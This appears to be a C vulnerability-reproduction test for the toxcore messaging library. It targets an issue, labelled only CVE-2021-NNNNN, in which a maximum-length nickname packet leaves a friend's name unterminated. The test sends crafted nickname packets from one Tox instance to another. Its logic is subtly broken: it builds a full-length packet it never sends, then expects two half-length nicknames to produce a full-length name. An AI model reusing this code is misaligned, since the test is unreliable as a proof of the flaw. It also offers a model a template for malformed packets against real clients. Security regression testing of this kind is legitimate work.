/*
 * Test for CVE-2021-NNNNN: Lack of null termination in nickname handling.
 *
 * This test demonstrates a vulnerability where receiving a nickname packet
 * with a length equal to TOX_MAX_NAME_LENGTH causes the friend's name
 * in the Friend struct to not be null-terminated. This can lead to
 * out-of-bounds reads when other parts of the application access the name.
 */

#include <string.h>
#include <assert.h>

#include "auto_test_support.h"
#include "../toxcore/tox.h"
#include "../toxcore/tox_options.h"

// From toxcore/net_crypto.h
#define PACKET_ID_NICKNAME 48

static void vulnerability_test(AutoTox *toxes)
{
    uint8_t packet[1 + TOX_MAX_NAME_LENGTH];
    packet[0] = PACKET_ID_NICKNAME;
    memset(packet + 1, 'A', TOX_MAX_NAME_LENGTH);

    uint8_t packet1[1 + TOX_MAX_NAME_LENGTH / 2];
    packet1[0] = PACKET_ID_NICKNAME;
    memset(packet1 + 1, 'A', sizeof(packet1) - 1);

    Tox_Err_Friend_Custom_Packet error;
    bool success = tox_friend_send_lossless_packet(toxes[0].tox, 0, packet1, sizeof(packet1), &error);
    if (!success) {
        printf("tox_friend_send_lossless_packet failed with error code: %u\\n", error);
    }
    assert(success);
    assert(error == TOX_ERR_FRIEND_CUSTOM_PACKET_OK);

    // Iterate all toxes to make sure the first packet is sent and acknowledged.
    for (int i = 0; i < 50; ++i) {
        iterate_all_wait(toxes, 2, ITERATION_INTERVAL);
    }

    uint8_t packet2[1 + TOX_MAX_NAME_LENGTH / 2];
    packet2[0] = PACKET_ID_NICKNAME;
    memset(packet2 + 1, 'A', sizeof(packet2) - 1);

    success = tox_friend_send_lossless_packet(toxes[0].tox, 0, packet2, sizeof(packet2), &error);
    if (!success) {
        printf("tox_friend_send_lossless_packet failed with error code: %u\\n", error);
    }
    assert(success);
    assert(error == TOX_ERR_FRIEND_CUSTOM_PACKET_OK);

    // Iterate a few times to make sure the packet is processed.
    for (int i = 0; i < 50; ++i) {
        iterate_all_wait(toxes, 2, ITERATION_INTERVAL);
    }

    Tox_Err_Friend_Query q_error;
    size_t name_size = tox_friend_get_name_size(toxes[1].tox, 0, &q_error);
    assert(q_error == TOX_ERR_FRIEND_QUERY_OK);
    assert(name_size == TOX_MAX_NAME_LENGTH);

    // Allocate a larger buffer and fill it with a known pattern to detect over-read.
    uint8_t name_buffer[TOX_MAX_NAME_LENGTH + 16];
    memset(name_buffer, 'C', sizeof(name_buffer));

    success = tox_friend_get_name(toxes[1].tox, 0, name_buffer, &q_error);
    assert(success);
    assert(q_error == TOX_ERR_FRIEND_QUERY_OK);

    // Check that the name was copied correctly.
    uint8_t expected_name[TOX_MAX_NAME_LENGTH];
    memset(expected_name, 'A', sizeof(expected_name));
    assert(memcmp(name_buffer, expected_name, TOX_MAX_NAME_LENGTH) == 0);

    // Crucially, check for the lack of a null terminator.
    // The byte after the copied name should still be 'C', not '\0'.
    assert(name_buffer[TOX_MAX_NAME_LENGTH] == 'C');

    printf("Vulnerability test passed: Nickname was not null-terminated, as expected.\n");
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);

    Run_Auto_Options options = default_run_auto_options();
    options.events = false;
    options.graph = GRAPH_LINEAR;

    struct Tox_Options *tox_options = tox_options_new(NULL);
    tox_options_set_log_callback(tox_options, print_debug_log);

    run_auto_test(tox_options, 2, vulnerability_test, 0, &options);
    tox_options_free(tox_options);

    return 0;
}
